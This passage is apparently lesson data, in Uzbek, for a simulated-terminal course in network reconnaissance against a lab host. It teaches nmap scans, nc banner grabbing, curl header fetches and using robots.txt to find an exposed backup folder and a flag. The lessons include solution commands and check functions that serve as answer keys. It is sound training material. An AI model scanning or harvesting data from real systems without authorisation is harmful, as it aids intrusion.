      solution: ['nmap -sV portal.lab'],
      check: ({ output }) => output.includes('Apache httpd 2.4.49'),
    },
    {
      id: 'nmap-p',
      teach: ['nmap -p PORTLAR'],
      text: 'Faqat 21 dan 25 gacha portlarni tekshiring.',
      hint: '`nmap -p 21-25 portal.lab` — yopiqlari ham "closed" bo\'lib ko\'rinadi.',
      solution: ['nmap -p 21-25 portal.lab'],
      check: ({ output }) => output.includes('21/tcp') && output.includes('closed') && output.includes('22/tcp   open'),
    },
    {
      id: 'nc-z',
      teach: ['nc', 'nc -z', 'nc -v'],
      text: '`nc` bilan ham tekshiring: `portal.lab` da 3306 port ochiqmi?',
      hint: '`nc -zv portal.lab 3306` — -z: ma\'lumot yubormasdan, -v: natijani aytadi.',
      solution: ['nc -zv portal.lab 3306'],
      check: ({ output }) => output.includes('3306 port [tcp/*] succeeded'),
    },
    {
      id: 'banner',
      text: 'SSH portiga ulanib, xizmat o\'zi haqida nima deyishini (banner) ko\'ring.',
      hint: '`nc portal.lab 22`',
      solution: ['nc portal.lab 22'],
      check: ({ output }) => output.startsWith('SSH-2.0-OpenSSH_8.2p1'),
    },
    {
      id: 'curl-i',
      teach: ['curl', 'curl -I'],
      text: 'Veb-server javobining faqat sarlavhalarini oling. Qaysi dasturlar oshkor bo\'lmoqda?',
      hint: '`curl -I http://portal.lab/` — Server va X-Powered-By sarlavhalari.',
      solution: ['curl -I http://portal.lab/'],
      check: ({ output }) => output.includes('Server: Apache/2.4.49') && output.includes('X-Powered-By: PHP/7.4.3'),
    },
    {
      id: 'web',
      text: 'Bosh sahifaning kodini oling va diqqat bilan o\'qing.',
      hint: '`curl http://portal.lab/` — HTML izohlariga (<!-- ... -->) e\'tibor bering.',
      solution: ['curl http://portal.lab/'],
      check: ({ output }) => output.includes('Ichki portal') && output.includes('robots.txt'),
    },
    {
      id: 'robots',
      text: 'Izohda eslatilgan faylni tekshiring.',
      hint: '`curl http://portal.lab/robots.txt` — robots.txt qidiruv tizimlari uchun, lekin istalgan odam o\'qiy oladi.',
      solution: ['curl http://portal.lab/robots.txt'],
      check: ({ output }) => output.includes('Disallow: /zaxira/'),
    },
    {
      id: 'zaxira',
      text: '"Yashirilgan" katalog ichida nima bor?',
      hint: '`curl http://portal.lab/zaxira/` — katalog ro\'yxati ochiq qolgan.',
      solution: ['curl http://portal.lab/zaxira/'],
      check: ({ output }) => output.includes('db-2026.sql.gz'),
    },
    {
      id: 'curl-o',
      teach: ['curl -o FAYL'],
      text: 'Undagi eslatmani dalil sifatida `eslatma.txt` fayliga saqlang.',
      hint: '`curl -o eslatma.txt http://portal.lab/zaxira/eslatma.txt`, keyin `cat eslatma.txt`.',
      solution: ['curl -o eslatma.txt http://portal.lab/zaxira/eslatma.txt'],
      check: ({ state }) => (fileAt(state, `${HOME}/eslatma.txt`) ?? '').includes('flag{robots_txt_sir_saqlamaydi}'),
    },
    {
      id: 'mx',
      teach: ['dig MX / TXT / NS'],
      text: 'Tashqi dunyo: `example.com` ning pochta serveri (MX yozuvi) qaysi?',
      hint: '`dig +short example.com MX`',
      solution: ['dig +short example.com MX'],
      check: ({ output }) => output.includes('mail.example.com'),
    },
    {
      id: 'trace',
      teach: ['traceroute'],
      text: '`example.com` gacha paket qaysi yo\'llardan o\'tadi?',
      hint: '`traceroute example.com` — birinchi sakrash — sizning shlyuzingiz.',
      solution: ['traceroute example.com'],
      check: ({ output }) => output.includes('gateway (10.10.10.1)') && output.includes('203.0.113.80'),
    },
    {
      id: 'challenge',
      challenge: true,
      text: 'Mustaqil vazifa: hisobot uchun `portal.lab` dagi ma\'lumotlar bazasi porti va uning versiyasini `hisobot.txt` fayliga saqlang (faqat shu port natijasi).',
      hint: '`nmap -sV -p 3306 portal.lab > hisobot.txt`, tekshirish: `cat hisobot.txt`',
      solution: ['nmap -sV -p 3306 portal.lab > hisobot.txt'],
      check: ({ state }) => {
        const t = fileAt(state, `${HOME}/hisobot.txt`) ?? '';
        return t.includes('3306/tcp') && t.includes('MySQL 5.7.33') && !t.includes('22/tcp');
      },
    },
  ],
};
